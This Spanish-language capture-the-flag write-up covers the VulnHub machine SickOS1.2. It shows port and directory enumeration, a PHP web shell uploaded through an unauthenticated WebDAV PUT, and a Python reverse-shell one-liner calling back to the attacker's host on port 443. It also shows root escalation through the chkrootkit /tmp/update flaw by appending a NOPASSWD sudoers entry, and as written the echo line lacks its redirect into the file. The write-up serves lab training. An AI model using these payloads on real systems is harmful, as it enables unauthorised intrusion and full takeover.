# SickOS1.2
Desarrollo del CTF SickOS1.2
Download: https://www.vulnhub.com/entry/sickos-12,144/

## Escaneo de Puertos

### 1. Escaneamos todos los puertos TCP

```
nmap -n -P0 -p- -sC -sV -O -T5 -oA full 192.168.78.142
Nmap scan report for 192.168.78.142
Host is up (0.00090s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 66:8c:c0:f2:85:7c:6c:c0:f6:ab:7d:48:04:81:c2:d4 (DSA)
|   2048 ba:86:f5:ee:cc:83:df:a6:3f:fd:c1:34:bb:7e:62:ab (RSA)
|_  256 a1:6c:fa:18:da:57:1d:33:2c:52:e4:ec:97:e2:9e:af (ECDSA)
80/tcp open  http    lighttpd 1.4.28
|_http-server-header: lighttpd/1.4.28
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:E5:F7:14 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.16 - 4.6, Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


## Enumeración de servicios.

- Sólo encontramos una carpeta llamada /test/
```
root@kali:~/SICKOS# gobuster dir -u http://192.168.78.142/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.78.142/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/02/28 18:41:01 Starting gobuster
===============================================================
/test (Status: 301)
/%7Echeckout%7E (Status: 403)
===============================================================
2021/02/28 18:41:33 Finished
===============================================================
```

<img src="https://github.com/El-Palomo/SickOS1.2/blob/main/sickos1.jpg" width="80%"></img>

- Descargué la imagen y busque cadenas importantes. Sin éxito.
- Probé credenciales básicas sobre SSH. Sin éxito.
- Busqué carpetas y archivos con un listado más grande. Sin éxito.
- La búsqueda con NIKTO no arrojaba nada importante: archivo robot.txt, comentarios en html.
- Lo único que se tiene es la carpeta /test/.

## Identificando Vulnerabilidad

1. Si revisamos con calma identificamos que los métodos soportados en la carpeta /test es diferente al de la carpeta raiz.
Moraleja: Se debe buscar los métodos en cada carpeta

```
root@kali:~/SICKOS# nmap -n -P0 -p 80 --script http-methods.nse 192.168.78.142
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-28 18:54 EST
Nmap scan report for 192.168.78.142
Host is up (0.00026s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
MAC Address: 00:0C:29:E5:F7:14 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 15.44 seconds
root@kali:~/SICKOS# nmap -n -P0 -p 80 --script http-methods.nse --script-args http-methods.url-path='/test' 192.168.78.142
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-28 18:55 EST
Nmap scan report for 192.168.78.142
Host is up (0.00031s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-methods: 
|   Supported Methods: PROPFIND DELETE MKCOL PUT MOVE COPY PROPPATCH LOCK UNLOCK GET HEAD POST OPTIONS
|   Potentially risky methods: PROPFIND DELETE MKCOL PUT MOVE COPY PROPPATCH LOCK UNLOCK
|_  Path tested: /test
MAC Address: 00:0C:29:E5:F7:14 (VMware)
```
<img src="https://github.com/El-Palomo/SickOS1.2/blob/main/sickos2.jpg" width="80%"></img>

- Otra manera de revisar los métodos soportados es:

```
root@kali:~/SICKOS# curl -v -X OPTIONS http://192.168.78.142/test/
*   Trying 192.168.78.142:80...
* Connected to 192.168.78.142 (192.168.78.142) port 80 (#0)
> OPTIONS /test/ HTTP/1.1
> Host: 192.168.78.142
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< DAV: 1,2
< MS-Author-Via: DAV
< Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
< Allow: OPTIONS, GET, HEAD, POST
< Content-Length: 0
< Date: Mon, 01 Mar 2021 01:27:29 GMT
< Server: lighttpd/1.4.28
```
<img src="https://github.com/El-Palomo/SickOS1.2/blob/main/sickos3.jpg" width="80%"></img>


## Explotando la Vulnerabilidad

- A través del método PUT podemos cargar archivos sin requerir credenciales de acceso.
- A través de BURP SUITE me parece mas rápido y sencillo:

```
PUT /test/cmd.php HTTP/1.1
Host: 192.168.78.142
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 30

<?php system($_GET["cmd"]); ?>
```

<img src="https://github.com/El-Palomo/SickOS1.2/blob/main/sickos4.jpg" width="80%"></img>

<img src="https://github.com/El-Palomo/SickOS1.2/blob/main/sickos5.jpg" width="80%"></img>

- A través de este mecanismo podemos obtener una conexión reversa:

```
/* En el navegador colocamos lo siguiente:*/

http://192.168.78.142/test/test7.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.78.131%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27

/*Esto es lo que se coloca después de CMD*/

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

ATTACKING-IP: Colocar la IP de KALI
```

- Importante se está utilizando el puerto 443 porque a través de otros puertos no convencionales no se establecia la conexión

<img src="https://github.com/El-Palomo/SickOS1.2/blob/main/sickos6.jpg" width="80%"></img>

## Elevar Privilegios

- Toca probar todas las técnicas conocidas: sudo, suid, archivos de configuración, version de kernel, etc. Sin éxito.
- El proceso de elevación de privilegios estaba en el proceso CRON.

### Buscar los archivos que CRON ejecuta:

- En CRON.DAILY existe un archivo que resalta: CHKROOTKIT.
- CHKROOTKIT es una tool que sirve para identificar ROOTKIS. Que un CTF tenga esta tool, es super raro.

```
www-data@ubuntu:/etc$ ls -laR /etc/cron*
ls -laR /etc/cron*
-rw-r--r-- 1 root root  722 Jun 19  2012 /etc/crontab

ls: cannot open directory /etc/cron.d: Permission denied
/etc/cron.daily:
total 72
drwxr-xr-x  2 root root  4096 Apr 12  2016 .
drwxr-xr-x 84 root root  4096 Feb 27 15:17 ..
-rw-r--r--  1 root root   102 Jun 19  2012 .placeholder
-rwxr-xr-x  1 root root 15399 Nov 15  2013 apt
-rwxr-xr-x  1 root root   314 Apr 18  2013 aptitude
-rwxr-xr-x  1 root root   502 Mar 31  2012 bsdmainutils
-rwxr-xr-x  1 root root  2032 Jun  4  2014 chkrootkit
-rwxr-xr-x  1 root root   256 Oct 14  2013 dpkg
-rwxr-xr-x  1 root root   338 Dec 20  2011 lighttpd
-rwxr-xr-x  1 root root   372 Oct  4  2011 logrotate
-rwxr-xr-x  1 root root  1365 Dec 28  2012 man-db
-rwxr-xr-x  1 root root   606 Aug 17  2011 mlocate
-rwxr-xr-x  1 root root   249 Sep 12  2012 passwd
-rwxr-xr-x  1 root root  2417 Jul  1  2011 popularity-contest
-rwxr-xr-x  1 root root  2947 Jun 19  2012 standard

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Mar 30  2016 .
drwxr-xr-x 84 root root 4096 Feb 27 15:17 ..
-rw-r--r--  1 root root  102 Jun 19  2012 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Mar 30  2016 .
drwxr-xr-x 84 root root 4096 Feb 27 15:17 ..
-rw-r--r--  1 root root  102 Jun 19  2012 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x  2 root root 4096 Mar 30  2016 .
drwxr-xr-x 84 root root 4096 Feb 27 15:17 ..
-rw-r--r--  1 root root  102 Jun 19  2012 .placeholder
-rwxr-xr-x  1 root root  730 Sep 13  2013 apt-xapian-index
-rwxr-xr-x  1 root root  907 Dec 28  2012 man-db
```

- Revisar la versión de CHKROOT instalado

```
www-data@ubuntu:/etc$ dpkg -l | grep chkrootkit
dpkg -l | grep chkrootkit
rc  chkrootkit                      0.49-4ubuntu1.1                   rootkit detector
```

- Buscar si la versión instalada cuenta con alguna vulnerabilidad. En EXPLOIT-DB nos indican la vulnerabilidad: https://www.exploit-db.com/exploits/33899

<img src="https://github.com/El-Palomo/SickOS1.2/blob/main/sickos7.jpg" width="80%"></img>

- Debemos leer la documentación de la vulnerabilidad:

```
Steps to reproduce:

- Put an executable file named 'update' with non-root owner in /tmp (not
mounted noexec, obviously)
- Run chkrootkit (as uid 0)

Result: The file /tmp/update will be executed as root, thus effectively
rooting your box, if malicious content is placed inside the file.

If an attacker knows you are periodically running chkrootkit (like in
cron.daily) and has write access to /tmp (not mounted noexec), he may
easily take advantage of this.

```

- En resumen dice: colocar un archivo llamado /tmp/update con privilegios de ejecución y CRON lo ejecutará con privilegios de ROOT.

```
www-data@ubuntu:/tmp$ echo 'echo "www-data ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers'
www-data@ubuntu:/tmp$ chmod +x update

www-data@ubuntu:/tmp$ sudo su
sudo su
root@ubuntu:/tmp# id
id
uid=0(root) gid=0(root) groups=0(root)  
```

<img src="https://github.com/El-Palomo/SickOS1.2/blob/main/sickos8.jpg" width="80%"></img>
